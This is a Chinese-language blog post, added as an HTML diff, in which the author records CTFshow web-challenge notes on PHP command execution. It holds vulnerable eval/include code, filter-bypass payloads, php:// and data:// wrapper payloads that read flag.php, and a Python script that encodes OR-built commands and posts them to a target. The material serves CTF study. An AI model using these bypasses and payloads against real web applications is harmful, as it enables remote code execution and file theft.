@@ -1,0 +1,449 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+  <meta charset="UTF-8">
+<meta name="viewport" content="width=device-width, initial-scale=1, maximum-scale=2">
+<meta name="theme-color" content="#222">
+<meta name="generator" content="Hexo 5.3.0">
+  <link rel="apple-touch-icon" sizes="180x180" href="/images/apple-touch-icon-next.png">
+  <link rel="icon" type="image/png" sizes="32x32" href="/images/favicon-32x32-next.png">
+  <link rel="icon" type="image/png" sizes="16x16" href="/images/favicon-16x16-next.png">
+  <link rel="mask-icon" href="/images/logo.svg" color="#222">
+
+<link rel="stylesheet" href="/css/main.css">
+
+
+<link rel="stylesheet" href="/lib/font-awesome/css/all.min.css">
+
+<script id="hexo-configurations">
+    var NexT = window.NexT || {};
+    var CONFIG = {"hostname":"jingdaqiang.github.io","root":"/","scheme":"Muse","version":"7.8.0","exturl":false,"sidebar":{"position":"left","display":"post","padding":18,"offset":12,"onmobile":false},"copycode":{"enable":false,"show_result":false,"style":null},"back2top":{"enable":true,"sidebar":false,"scrollpercent":false},"bookmark":{"enable":false,"color":"#222","save":"auto"},"fancybox":false,"mediumzoom":false,"lazyload":false,"pangu":false,"comments":{"style":"tabs","active":null,"storage":true,"lazyload":false,"nav":null},"algolia":{"hits":{"per_page":10},"labels":{"input_placeholder":"Search for Posts","hits_empty":"We didn't find any results for the search: ${query}","hits_stats":"${hits} results found in ${time} ms"}},"localsearch":{"enable":false,"trigger":"auto","top_n_per_article":1,"unescape":false,"preload":false},"motion":{"enable":true,"async":false,"transition":{"post_block":"fadeIn","post_header":"slideDownIn","post_body":"slideDownIn","coll_header":"slideLeftIn","sidebar":"slideUpIn"}}};
+  </script>
+
+  <meta name="description" content="写在前面老实说之前没怎么学，很乱。现在开始 以后所有的东西都会不一样。不是立flag，而是背水一战。 sql注入的总结先鸽一鸽，我觉得命令执行更紧迫些 本篇主要是我在刷CTFshow的一些思考，可能比较傻瓜，会参考My0n9s’blog（其实就是对康师傅这篇的补充总结扩展），以及CSDN优秀的WP，希望全面些。会一直更新。 命令执行用到的函数一般在PHP语言里面，涉及到eval()函数，并且参数可">
+<meta property="og:type" content="article">
+<meta property="og:title" content="命令执行">
+<meta property="og:url" content="https://jingdaqiang.github.io/2021/04/21/%E5%91%BD%E4%BB%A4%E6%89%A7%E8%A1%8C/index.html">
+<meta property="og:site_name" content="Daq1ang">
+<meta property="og:description" content="写在前面老实说之前没怎么学，很乱。现在开始 以后所有的东西都会不一样。不是立flag，而是背水一战。 sql注入的总结先鸽一鸽，我觉得命令执行更紧迫些 本篇主要是我在刷CTFshow的一些思考，可能比较傻瓜，会参考My0n9s’blog（其实就是对康师傅这篇的补充总结扩展），以及CSDN优秀的WP，希望全面些。会一直更新。 命令执行用到的函数一般在PHP语言里面，涉及到eval()函数，并且参数可">
+<meta property="og:locale" content="en_US">
+<meta property="og:image" content="https://jingdaqiang.github.io/2021/04/21/%E5%91%BD%E4%BB%A4%E6%89%A7%E8%A1%8C/1.0.png">
+<meta property="og:image" content="https://jingdaqiang.github.io/2021/04/21/%E5%91%BD%E4%BB%A4%E6%89%A7%E8%A1%8C/1.1.png">
+<meta property="article:published_time" content="2021-04-21T01:34:39.000Z">
+<meta property="article:modified_time" content="2021-04-22T01:41:42.369Z">
+<meta property="article:author" content="六公子买单">
+<meta property="article:tag" content="CTF-Web">
+<meta name="twitter:card" content="summary">
+<meta name="twitter:image" content="https://jingdaqiang.github.io/2021/04/21/%E5%91%BD%E4%BB%A4%E6%89%A7%E8%A1%8C/1.0.png">
+
+<link rel="canonical" href="https://jingdaqiang.github.io/2021/04/21/%E5%91%BD%E4%BB%A4%E6%89%A7%E8%A1%8C/">
+
+
+<script id="page-configurations">
+  // https://hexo.io/docs/variables.html
+  CONFIG.page = {
+    sidebar: "",
+    isHome : false,
+    isPost : true,
+    lang   : 'en'
+  };
+</script>
+
+  <title>命令执行 | Daq1ang</title>
+  
+
+
+
+
+
+
+  <noscript>
+  <style>
+  .use-motion .brand,
+  .use-motion .menu-item,
+  .sidebar-inner,
+  .use-motion .post-block,
+  .use-motion .pagination,
+  .use-motion .comments,
+  .use-motion .post-header,
+  .use-motion .post-body,
+  .use-motion .collection-header { opacity: initial; }
+
+  .use-motion .site-title,
+  .use-motion .site-subtitle {
+    opacity: initial;
+    top: initial;
+  }
+
+  .use-motion .logo-line-before i { left: initial; }
+  .use-motion .logo-line-after i { right: initial; }
+  </style>
+</noscript>
+
+</head>
+
+<body itemscope itemtype="http://schema.org/WebPage">
+  <div class="container use-motion">
+    <div class="headband"></div>
+
+    <header class="header" itemscope itemtype="http://schema.org/WPHeader">
+      <div class="header-inner"><div class="site-brand-container">
+  <div class="site-nav-toggle">
+    <div class="toggle" aria-label="Toggle navigation bar">
+      <span class="toggle-line toggle-line-first"></span>
+      <span class="toggle-line toggle-line-middle"></span>
+      <span class="toggle-line toggle-line-last"></span>
+    </div>
+  </div>
+
+  <div class="site-meta">
+
+    <a href="/" class="brand" rel="start">
+      <span class="logo-line-before"><i></i></span>
+      <h1 class="site-title">Daq1ang</h1>
+      <span class="logo-line-after"><i></i></span>
+    </a>
+  </div>
+
+  <div class="site-nav-right">
+    <div class="toggle popup-trigger">
+    </div>
+  </div>
+</div>
+
+
+
+
+<nav class="site-nav">
+  <ul id="menu" class="main-menu menu">
+        <li class="menu-item menu-item-home">
+
+    <a href="/" rel="section"><i class="fa fa-home fa-fw"></i>Home</a>
+
+  </li>
+        <li class="menu-item menu-item-archives">
+
+    <a href="/archives/" rel="section"><i class="fa fa-archive fa-fw"></i>Archives</a>
+
+  </li>
+  </ul>
+</nav>
+
+
+
+
+</div>
+    </header>
+
+    
+  <div class="back-to-top">
+    <i class="fa fa-arrow-up"></i>
+    <span>0%</span>
+  </div>
+
+
+    <main class="main">
+      <div class="main-inner">
+        <div class="content-wrap">
+          
+
+          <div class="content post posts-expand">
+            
+
+    
+  
+  
+  <article itemscope itemtype="http://schema.org/Article" class="post-block" lang="en">
+    <link itemprop="mainEntityOfPage" href="https://jingdaqiang.github.io/2021/04/21/%E5%91%BD%E4%BB%A4%E6%89%A7%E8%A1%8C/">
+
+    <span hidden itemprop="author" itemscope itemtype="http://schema.org/Person">
+      <meta itemprop="image" content="/images/avatar.gif">
+      <meta itemprop="name" content="六公子买单">
+      <meta itemprop="description" content="一头努力的菜鸟">
+    </span>
+
+    <span hidden itemprop="publisher" itemscope itemtype="http://schema.org/Organization">
+      <meta itemprop="name" content="Daq1ang">
+    </span>
+      <header class="post-header">
+        <h1 class="post-title" itemprop="name headline">
+          命令执行
+        </h1>
+
+        <div class="post-meta">
+            <span class="post-meta-item">
+              <span class="post-meta-item-icon">
+                <i class="far fa-calendar"></i>
+              </span>
+              <span class="post-meta-item-text">Posted on</span>
+
+              <time title="Created: 2021-04-21 09:34:39" itemprop="dateCreated datePublished" datetime="2021-04-21T09:34:39+08:00">2021-04-21</time>
+            </span>
+              <span class="post-meta-item">
+                <span class="post-meta-item-icon">
+                  <i class="far fa-calendar-check"></i>
+                </span>
+                <span class="post-meta-item-text">Edited on</span>
+                <time title="Modified: 2021-04-22 09:41:42" itemprop="dateModified" datetime="2021-04-22T09:41:42+08:00">2021-04-22</time>
+              </span>
+
+          
+
+        </div>
+      </header>
+
+    
+    
+    
+    <div class="post-body" itemprop="articleBody">
+
+      
+        <h1 id="写在前面"><a href="#写在前面" class="headerlink" title="写在前面"></a>写在前面</h1><p>老实说之前没怎么学，很乱。现在开始 以后所有的东西都会不一样。不是立flag，而是背水一战。</p>
+<p>sql注入的总结先鸽一鸽，我觉得命令执行更紧迫些</p>
+<p>本篇主要是我在刷CTFshow的一些思考，可能比较傻瓜，会参考My0n9s’blog（其实就是对康师傅这篇的补充总结扩展），以及CSDN优秀的WP，希望全面些。会一直更新。</p>
+<h1 id="命令执行用到的函数"><a href="#命令执行用到的函数" class="headerlink" title="命令执行用到的函数"></a>命令执行用到的函数</h1><p>一般在PHP语言里面，涉及到eval()函数，并且参数可控，可以考虑命令执行。<br>biru:</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line"> &lt;?php</span><br><span class="line">error_reporting(0);</span><br><span class="line">if(isset($_GET[&#39;c&#39;]))&#123;</span><br><span class="line">    $c &#x3D; $_GET[&#39;c&#39;];    &#x2F;&#x2F;传入参数c</span><br><span class="line">    if(!preg_match(&quot;&#x2F;flag&#x2F;i&quot;, $c))&#123;</span><br><span class="line">        eval($c);   &#x2F;&#x2F;涉及eval(),zezeze</span><br><span class="line">    &#125;</span><br><span class="line">&#125;else&#123;</span><br><span class="line">    highlight_file(__FILE__);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
+<p>执行系统命令的函数（函数和命令互相搭配使用）：</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">system()    &#x2F;&#x2F;常见system(&quot;ls&quot;);查看目录</span><br><span class="line">passthru()</span><br><span class="line">exec()</span><br><span class="line">shell_exec()</span><br><span class="line">popen()</span><br><span class="line">proc_open()</span><br><span class="line">pcntl_exec()</span><br></pre></td></tr></table></figure>
+<p>其中 反引号 `` 等效于 shell_exec(实用)</p>
+<p>其中system()函数的执行结果有回显（比较直接），</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">?c&#x3D;system(&#39;ls&#39;);  &#x2F;&#x2F;查看目录</span><br><span class="line">?c&#x3D;system(&#39;cat fla*&#39;);  &#x2F;&#x2F;读取文件</span><br></pre></td></tr></table></figure>
+<p>其他需要 echo 来打印出来（函数负责执行命令，echo起到帮助回显的作用）:</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">?c&#x3D;echo &#96;tac fl&#39;&#39;ag.php&#96;;</span><br><span class="line">?c&#x3D;echo exec(&#39;nl fla?????&#39;);</span><br></pre></td></tr></table></figure>
+<p>命令执行语句末要加分号;</p>
+<h1 id="等效替换-绕过过滤"><a href="#等效替换-绕过过滤" class="headerlink" title="等效替换/绕过过滤"></a>等效替换/绕过过滤</h1><p>空格被过滤</p>
+<pre><code>%09   $IFS$9  $&#123;IFS&#125;   $IFS%09   &lt;   &lt;&gt;   等替换</code></pre>
+<p>cat被过滤</p>
+<pre><code>tac、more、less、head、tail、nl、sed、sort、uniq、rev 进行替换</code></pre>
+<p>过滤了要获取的关键词，比如flag.php 可以用 ?、<em>、’’来代替。eg:fla?.???,fla</em>,fla’’g.php 来绕过</p>
+<p>linux 语法过滤了分号，可以用 %0a 来绕过（相当于回车）</p>
+<p>PHP语法过滤了分号 可用 ?&gt;来绕过</p>
+<p>利用反斜杠 比如对cat进行限制 我们可以用 ca\t 绕过 ，过滤了 flag , php 我们用 fl\ag.p\hp 绕过</p>
+<h1 id="利用include函数-伪协议绕过大部分过滤"><a href="#利用include函数-伪协议绕过大部分过滤" class="headerlink" title="利用include函数+伪协议绕过大部分过滤"></a>利用include函数+伪协议绕过大部分过滤</h1><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line">&lt;?php</span><br><span class="line">error_reporting(0);</span><br><span class="line">if(isset($_GET[&#39;c&#39;]))&#123;</span><br><span class="line">    $c &#x3D; $_GET[&#39;c&#39;];</span><br><span class="line">    if(!preg_match(&quot;&#x2F;flag|system|php|cat|sort|shell|\.| |\&#39;|\&#96;|echo|\;|\(|\&quot;&#x2F;i&quot;, $c))&#123;</span><br><span class="line">        eval($c);</span><br><span class="line">    &#125;</span><br><span class="line">    </span><br><span class="line">&#125;else&#123;</span><br><span class="line">    highlight_file(__FILE__);</span><br><span class="line">&#125; </span><br><span class="line">?&gt;</span><br></pre></td></tr></table></figure>
+<p>该ban的都ban了（过滤内容太多，绕过太麻烦或无法绕过考虑文件包含）</p>
+<pre><code>?c=include$_POST[1]?&gt; //include和$_POST之间没有空格
+POST: 1=php://filter/read=convert.base64-encode/resource=flag.php
+
+?c=include$_GET[1]?&gt;&amp;1=php://filter/read=convert.base64-
+encode/resource=flag.php//过滤只对前半句产生影响
+
+c=include$_GET[1]?&gt;&amp;1=data://text/plain,&lt;?php system(&quot;cat flag.php&quot;);?&gt;
+
+c=include$_GET[1]?&gt;&amp;1=data://text/plain;base64,PD9waHAgc3lzdGVtKCJjYXQgZmxhZy5waHAiKTs/Pg==</code></pre>
+<p>include + data协议</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line">error_reporting(0);</span><br><span class="line">if(isset($_GET[&#39;c&#39;]))&#123;</span><br><span class="line">    $c &#x3D; $_GET[&#39;c&#39;];</span><br><span class="line">    if(!preg_match(&quot;&#x2F;flag&#x2F;i&quot;, $c))&#123;</span><br><span class="line">        include($c);  </span><br><span class="line">        echo $flag;</span><br><span class="line">    </span><br><span class="line">    &#125;</span><br></pre></td></tr></table></figure>
+<pre><code>?c=data:text/plain,&lt;?php system(&#39;ls&#39;);?&gt;</code></pre>
+<p>若有过滤，可用base64</p>
+<h1 id="读文件-数组改造"><a href="#读文件-数组改造" class="headerlink" title="读文件+数组改造"></a>读文件+数组改造</h1><p>CTFshow(40)</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">if(isset($_GET[&#39;c&#39;]))&#123;</span><br><span class="line">    $c &#x3D; $_GET[&#39;c&#39;];</span><br><span class="line">    if(!preg_match(&quot;&#x2F;[0-9]|\~|\&#96;|\@|\#|\\$|\%|\^|\&amp;|\*|\（|\）|\-|\&#x3D;|\+|\&#123;|\[|\]|\&#125;|\:|\&#39;|\&quot;|\,|\&lt;|\.|\&gt;|\&#x2F;|\?|\\\\&#x2F;i&quot;, $c))&#123;</span><br><span class="line">        eval($c);</span><br><span class="line">    &#125; </span><br></pre></td></tr></table></figure>
+<p>过滤数字没过滤字母，没过滤英文括号，可用无参数RCE构造</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">print_r(scandir(&#39;.&#39;)); 查看当前目录下的所有文件名</span><br><span class="line"></span><br><span class="line">localeconv() 函数返回一包含本地数字及货币格式信息的数组。</span><br><span class="line"></span><br><span class="line">current() 函数返回数组中的当前元素（单元）,默认取第一个值，pos是current的别名</span><br></pre></td></tr></table></figure>
+<p>打印出当前目录下的文件</p>
+<pre><code>?c=print_r(scandir(current(localeconv())));</code></pre>
+<p>得<br><img src="/2021/04/21/%E5%91%BD%E4%BB%A4%E6%89%A7%E8%A1%8C/1.0.png"></p>
+<p>读取目录文件后，发现输出的是数组，而文件名是数组中的值，下一步我们需要取出想要读取文件的数组</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">each() 返回数组中当前的键&#x2F;值对并将数组指针向前移动一步</span><br><span class="line">end() 将数组的内部指针指向最后一个单元</span><br><span class="line">next() 将数组中的内部指针向前移动一位</span><br><span class="line">prev() 将数组中的内部指针倒回一位</span><br><span class="line">array_reverse() 以相反的元素顺序返回数组</span><br></pre></td></tr></table></figure>
+<p>读取文件函数</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">file_get_content()</span><br><span class="line">readfile()</span><br><span class="line">highlight_file()</span><br><span class="line">show_source()</span><br></pre></td></tr></table></figure>
+<p>flag.php在倒数第二位，构造payload，读取</p>
+<pre><code>?c=show_source(next(array_reverse(scandir(getcwd()))));</code></pre>
+<h1 id="无字母数字马构造"><a href="#无字母数字马构造" class="headerlink" title="无字母数字马构造"></a>无字母数字马构造</h1><p>CTFshow40</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">if(isset($_POST[&#39;c&#39;]))&#123;</span><br><span class="line">    $c &#x3D; $_POST[&#39;c&#39;];</span><br><span class="line">if(!preg_match(&#39;&#x2F;[0-9]|[a-z]|\^|\+|\~|\$|\[|\]|\&#123;|\&#125;|\&amp;|\-&#x2F;i&#39;, $c))&#123;</span><br><span class="line">        eval(&quot;echo($c);&quot;);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
+<p>过滤了数字字母和一些其他符号，但是可以用或运算符进行构造payload进行命令执行</p>
+<p>源码中禁止我们使用了数字3，（ascii码值为51），我们可以使用或运算符在没有被禁止的字符中构造出51来，比如19和32没有被禁止，我们进行或运算19|32=51，就可以获得51这个ascii码值，也就是成功得到了数字3</p>
+<p>知道了方法后，我们从ascii码表，也就是0-255中找到没有被过滤的字符进行或运算，以寻求得到我们想要的字符<br>结合了yu师傅给出的exp，一个独立的python脚本(或运算)</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br></pre></td><td class="code"><pre><span class="line">#-- coding:UTF-8 --</span><br><span class="line"># Author:dota_st</span><br><span class="line"># Date:2021&#x2F;2&#x2F;10 12:56</span><br><span class="line"># blog: www.wlhhlc.top</span><br><span class="line">import requests</span><br><span class="line">import urllib</span><br><span class="line">import re</span><br><span class="line">from sys import *</span><br><span class="line">if(len(argv)!&#x3D;2):</span><br><span class="line">    print(&quot;&#x3D;&quot;*50)</span><br><span class="line">    print(&#39;USER:python exp.py &lt;url&gt;&#39;)</span><br><span class="line">    print(&quot;eg:  python exp.py http:&#x2F;&#x2F;ctf.show&#x2F;&quot;)</span><br><span class="line">    print(&quot;exit: input exit in function&quot;)</span><br><span class="line">    print(&quot;&#x3D;&quot;*50)</span><br><span class="line">    exit(0)</span><br><span class="line">url&#x3D;argv[1]</span><br><span class="line"></span><br><span class="line">#生成可用的字符</span><br><span class="line">def write_rce():</span><br><span class="line">    result &#x3D; &#39;&#39;</span><br><span class="line">    preg &#x3D; &#39;[0-9]|[a-z]|\^|\+|\~|\$|\[|\]|\&#123;|\&#125;|\&amp;|\-&#39;</span><br><span class="line">    for i in range(256):</span><br><span class="line">        for j in range(256):</span><br><span class="line">            if not (re.match(preg, chr(i), re.I) or re.match(preg, chr(j), re.I)):</span><br><span class="line">                k &#x3D; i | j</span><br><span class="line">                if k &gt;&#x3D; 32 and k &lt;&#x3D; 126:</span><br><span class="line">                    a &#x3D; &#39;%&#39; + hex(i)[2:].zfill(2)</span><br><span class="line">                    b &#x3D; &#39;%&#39; + hex(j)[2:].zfill(2)</span><br><span class="line">                    result +&#x3D; (chr(k) + &#39; &#39; + a + &#39; &#39; + b + &#39;\n&#39;)</span><br><span class="line">    f &#x3D; open(&#39;rce.txt&#39;, &#39;w&#39;)</span><br><span class="line">    f.write(result)</span><br><span class="line">    </span><br><span class="line">#根据输入的命令在生成的txt中进行匹配</span><br><span class="line">def action(arg):</span><br><span class="line">    s1&#x3D;&quot;&quot;</span><br><span class="line">    s2&#x3D;&quot;&quot;</span><br><span class="line">    for i in arg:</span><br><span class="line">        f&#x3D;open(&quot;rce.txt&quot;,&quot;r&quot;)</span><br><span class="line">        while True:</span><br><span class="line">            t&#x3D;f.readline()</span><br><span class="line">            if t&#x3D;&#x3D;&quot;&quot;:</span><br><span class="line">                break</span><br><span class="line">            if t[0]&#x3D;&#x3D;i:</span><br><span class="line">                s1+&#x3D;t[2:5]</span><br><span class="line">                s2+&#x3D;t[6:9]</span><br><span class="line">                break</span><br><span class="line">        f.close()</span><br><span class="line">    output&#x3D;&quot;(\&quot;&quot;+s1+&quot;\&quot;|\&quot;&quot;+s2+&quot;\&quot;)&quot;</span><br><span class="line">    return(output)</span><br><span class="line"></span><br><span class="line">def main():</span><br><span class="line">    write_rce()</span><br><span class="line">    while True:</span><br><span class="line">        s1 &#x3D; input(&quot;\n[+] your function：&quot;)</span><br><span class="line">        if s1 &#x3D;&#x3D; &quot;exit&quot;:</span><br><span class="line">            break</span><br><span class="line">        s2 &#x3D; input(&quot;[+] your command：&quot;)</span><br><span class="line">        param&#x3D;action(s1) + action(s2)</span><br><span class="line">        data&#x3D;&#123;</span><br><span class="line">            &#39;c&#39;:urllib.parse.unquote(param)</span><br><span class="line">            &#125;</span><br><span class="line">        r&#x3D;requests.post(url,data&#x3D;data)</span><br><span class="line">        print(&quot;\n[*] result:\n&quot;+r.text)</span><br><span class="line"></span><br><span class="line">main()</span><br></pre></td></tr></table></figure>
+<p><img src="/2021/04/21/%E5%91%BD%E4%BB%A4%E6%89%A7%E8%A1%8C/1.1.png"></p>
+<p>//42-53直接输命令，和前面的如出一辙</p>
+<h1 id="用原始路径-通配符绕过"><a href="#用原始路径-通配符绕过" class="headerlink" title="用原始路径+通配符绕过"></a>用原始路径+通配符绕过</h1><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line">if(isset($_GET[&#39;c&#39;]))&#123;</span><br><span class="line">    $c&#x3D;$_GET[&#39;c&#39;];</span><br><span class="line">    if(!preg_match(&quot;&#x2F;\;|.*c.*a.*t.*|.*f.*l.*a.*g.*| |[0-9]|\*|.*m.*o.*r.*e.*|.*w.*g.*e.*t.*|.*l.*e.*s.*s.*|.*h.*e.*a.*d.*|.*s.*o.*r.*t.*|.*t.*a.*i.*l.*|.*s.*e.*d.*|.*c.*u.*t.*|.*t.*a.*c.*|.*a.*w.*k.*|.*s.*t.*r.*i.*n.*g.*s.*|.*o.*d.*|.*c.*u.*r.*l.*|.*n.*l.*|.*s.*c.*p.*|.*r.*m.*|\&#96;|\%|\x09|\x26|\&gt;|\&lt;&#x2F;i&quot;, $c))&#123;</span><br><span class="line">        system($c);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;else&#123;</span><br><span class="line">    highlight_file(__FILE__);</span><br><span class="line">&#125; </span><br></pre></td></tr></table></figure>
+    </div>
+
+    
+    
+    
+
+      <footer class="post-footer">
+          <div class="post-tags">
+              <a href="/tags/CTF-Web/" rel="tag"># CTF-Web</a>
+          </div>
+
+        
+
+
+        
+    <div class="post-nav">
+      <div class="post-nav-item">
+    <a href="/2021/03/30/SQL%E6%B3%A8%E5%85%A5/" rel="prev" title="SQL注入">
+      <i class="fa fa-chevron-left"></i> SQL注入
+    </a></div>
+      <div class="post-nav-item"></div>
+    </div>
+      </footer>
+    
+  </article>
+  
+  
+  
+
+
+
+          </div>
+          
+
+<script>
+  window.addEventListener('tabs:register', () => {
+    let { activeClass } = CONFIG.comments;
+    if (CONFIG.comments.storage) {
+      activeClass = localStorage.getItem('comments_active') || activeClass;
+    }
+    if (activeClass) {
+      let activeTab = document.querySelector(`a[href="#comment-${activeClass}"]`);
+      if (activeTab) {
+        activeTab.click();
+      }
+    }
+  });
+  if (CONFIG.comments.storage) {
+    window.addEventListener('tabs:click', event => {
+      if (!event.target.matches('.tabs-comment .tab-content .tab-pane')) return;
+      let commentClass = event.target.classList[1];
+      localStorage.setItem('comments_active', commentClass);
+    });
+  }
+</script>
+
+        </div>
+          
+  
+  <div class="toggle sidebar-toggle">
+    <span class="toggle-line toggle-line-first"></span>
+    <span class="toggle-line toggle-line-middle"></span>
+    <span class="toggle-line toggle-line-last"></span>
+  </div>
+
+  <aside class="sidebar">
+    <div class="sidebar-inner">
+
+      <ul class="sidebar-nav motion-element">
+        <li class="sidebar-nav-toc">
+          Table of Contents
+        </li>
+        <li class="sidebar-nav-overview">
+          Overview
+        </li>
+      </ul>
+
+      <!--noindex-->
+      <div class="post-toc-wrap sidebar-panel">
+          <div class="post-toc motion-element"><ol class="nav"><li class="nav-item nav-level-1"><a class="nav-link" href="#%E5%86%99%E5%9C%A8%E5%89%8D%E9%9D%A2"><span class="nav-number">1.</span> <span class="nav-text">写在前面</span></a></li><li class="nav-item nav-level-1"><a class="nav-link" href="#%E5%91%BD%E4%BB%A4%E6%89%A7%E8%A1%8C%E7%94%A8%E5%88%B0%E7%9A%84%E5%87%BD%E6%95%B0"><span class="nav-number">2.</span> <span class="nav-text">命令执行用到的函数</span></a></li><li class="nav-item nav-level-1"><a class="nav-link" href="#%E7%AD%89%E6%95%88%E6%9B%BF%E6%8D%A2-%E7%BB%95%E8%BF%87%E8%BF%87%E6%BB%A4"><span class="nav-number">3.</span> <span class="nav-text">等效替换&#x2F;绕过过滤</span></a></li><li class="nav-item nav-level-1"><a class="nav-link" href="#%E5%88%A9%E7%94%A8include%E5%87%BD%E6%95%B0-%E4%BC%AA%E5%8D%8F%E8%AE%AE%E7%BB%95%E8%BF%87%E5%A4%A7%E9%83%A8%E5%88%86%E8%BF%87%E6%BB%A4"><span class="nav-number">4.</span> <span class="nav-text">利用include函数+伪协议绕过大部分过滤</span></a></li><li class="nav-item nav-level-1"><a class="nav-link" href="#%E8%AF%BB%E6%96%87%E4%BB%B6-%E6%95%B0%E7%BB%84%E6%94%B9%E9%80%A0"><span class="nav-number">5.</span> <span class="nav-text">读文件+数组改造</span></a></li><li class="nav-item nav-level-1"><a class="nav-link" href="#%E6%97%A0%E5%AD%97%E6%AF%8D%E6%95%B0%E5%AD%97%E9%A9%AC%E6%9E%84%E9%80%A0"><span class="nav-number">6.</span> <span class="nav-text">无字母数字马构造</span></a></li><li class="nav-item nav-level-1"><a class="nav-link" href="#%E7%94%A8%E5%8E%9F%E5%A7%8B%E8%B7%AF%E5%BE%84-%E9%80%9A%E9%85%8D%E7%AC%A6%E7%BB%95%E8%BF%87"><span class="nav-number">7.</span> <span class="nav-text">用原始路径+通配符绕过</span></a></li></ol></div>
+      </div>
+      <!--/noindex-->
+
+      <div class="site-overview-wrap sidebar-panel">
+        <div class="site-author motion-element" itemprop="author" itemscope itemtype="http://schema.org/Person">
+  <p class="site-author-name" itemprop="name">六公子买单</p>
+  <div class="site-description" itemprop="description">一头努力的菜鸟</div>
+</div>
+<div class="site-state-wrap motion-element">
+  <nav class="site-state">
+      <div class="site-state-item site-state-posts">
+          <a href="/archives/">
+        
+          <span class="site-state-item-count">27</span>
+          <span class="site-state-item-name">posts</span>
+        </a>
+      </div>
+      <div class="site-state-item site-state-categories">
+        <span class="site-state-item-count">11</span>
+        <span class="site-state-item-name">categories</span>
+      </div>
+      <div class="site-state-item site-state-tags">
+        <span class="site-state-item-count">15</span>
+        <span class="site-state-item-name">tags</span>
+      </div>
+  </nav>
+</div>
+
+
+
+      </div>
+
+    </div>
+  </aside>
+  <div id="sidebar-dimmer"></div>
+
+
+      </div>
+    </main>
+
+    <footer class="footer">
+      <div class="footer-inner">
+        
+
+        
+
+<div class="copyright">
+  
+  &copy; 
+  <span itemprop="copyrightYear">2021</span>
+  <span class="with-love">
+    <i class="fa fa-heart"></i>
+  </span>
+  <span class="author" itemprop="copyrightHolder">六公子买单</span>
+</div>
